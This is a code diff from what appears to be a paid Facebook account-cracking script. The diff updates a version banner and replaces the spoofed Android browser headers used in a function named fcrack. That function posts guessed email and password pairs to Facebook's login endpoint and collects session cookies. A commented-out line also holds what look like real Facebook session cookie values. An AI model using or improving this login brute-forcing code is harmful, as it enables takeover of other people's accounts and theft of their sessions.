@@ -179,7 +179,7 @@ __   __  __   __  _______  _______  __   __  __   __  ___   ___
 \033[1;93m--------------------------------------------------
 \033[1;37m[-] OWNER     :\033[1;32m MUZZI TRICKER
 \033[1;37m[-] FACEBOOK    :\033[1;32m MUZAMMIL HUSSAIN
-\033[1;37m[-] VERSION   :\033[1;32m 1.1
+\033[1;37m[-] VERSION   :\033[1;32m 1.0
 \033[1;37m[-] STATUS    :\033[1;32m Paid
 --------------------------------------------------""")
 def linex():
@@ -528,25 +528,23 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'x.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'path',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
+			header_freefb = {'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=7cUHZT55wXX1t8sp0_YBjZFt; sb=7cUHZTHNBDM_O1Byoq_IlqIi; m_pixel_ratio=2; wd=360x676; fr=0TW7qD2i7wDszsLqA..BlB8Xt.ZQ.AAA.0.0.BlB8YD.AWWMJ7iBZBs',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"TECNO LD7"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
             'user-agent': ua}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
